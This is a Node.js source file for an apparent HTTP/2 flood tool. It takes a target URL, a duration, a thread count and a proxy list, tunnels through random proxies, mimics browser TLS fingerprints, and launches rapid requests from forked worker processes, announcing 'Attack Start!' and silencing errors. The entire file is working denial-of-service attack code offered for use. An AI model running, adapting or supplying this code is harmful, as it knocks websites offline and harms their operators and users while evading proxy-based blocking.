const http = require("http");
const tls = require("tls");
const crypto = require("crypto");
const cluster = require("cluster");
const fs = require("fs");
const url = require("url");
const os = require("os");
const http2 = require("http2-wrapper");
const { getHeaders } = require('./generator');

const [target, time, threads, ratelimit, proxyfile] = process.argv.slice(2);
const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
const parsed = url.parse(target);

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

process.on('uncaughtException', (e) => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) {
        return false;
    }
});
process.on('unhandledRejection', (e) => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) {
        return false;
    }
});
process.on('warning', (e) => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) {
        return false;
    }
});

function getRandomValue(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const agent = new http.Agent({
    keepAlive: true,
    keepAliveMsecs: 50000,
    maxSockets: Infinity,
    maxFreeSockets: Infinity,
    maxTotalSockets: Infinity,
    timeout: time * 1000,
});

function requestHandler(session, headersData, index) {
    const req = session.request(headersData);
    req.setEncoding('utf8');
    req.end();

    req.on('headers', (headers) => {
        const statusCode = headers[':status'];
        const titleMatch = headers[':content-type']?.match(/<title>(.*?)<\/title>/i);
        const title = titleMatch ? titleMatch[1] : 'No title';

        console.log(`[xNeonn] - ${statusCode} - ${title}`);
    });

    req.on('error', () => {});
}

function work() {
    const [proxyHost, proxyPort] = proxies[Math.floor(Math.random() * proxies.length)].split(':');
    const request = http.get({
        method: 'CONNECT',
        host: proxyHost,
        port: proxyPort,
        agent,
        path: `${parsed.host}:443`,
        headers: {
            'Connection': 'Keep-Alive',
            'Proxy-Connection': 'Keep-Alive'
        },
        rejectUnauthorized: true,
    });

    request.on('error', request.destroy);

    request.on('connect', (res, socket, { head }) => {
        if (head?.length) return socket.destroy();

        const ciphers = ['TLS_AES_128_GCM_SHA256', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256'].join(':');
        const sigalgs = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512';
        const options = getHeaders(parsed);

        const sessionOptions = {
            createConnection: (authority, option) => tls.connect({
                ...option,
                socket,
                servername: parsed.host,
                session: head,
                agent,
                secure: true,
                ALPNProtocols: ["h2", "http/1.1"],
                ciphers: ciphers,
                sigalgs: sigalgs,
                requestCert: true,
            }),
            settings: options.settings,
        };

        const session = http2.connect(`https://${parsed.host}`, sessionOptions);

        session.on('connect', () => {
            Array.from({ length: ratelimit }).forEach((_, index) => {
                const headersData = options.header;
                requestHandler(session, headersData, index);
            });
        });

        session.on('error', () => {
            session.destroy();
        });
    });
    request.end();
};

if (cluster.isMaster) {
    console.log('Attack Start! / @mitigations love you <3');
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    setTimeout(() => process.exit(-1), time * 1000);
} else {
    setInterval(work, 0); // Rapid firing of requests
    setTimeout(() => process.exit(-1), time * 1000);
}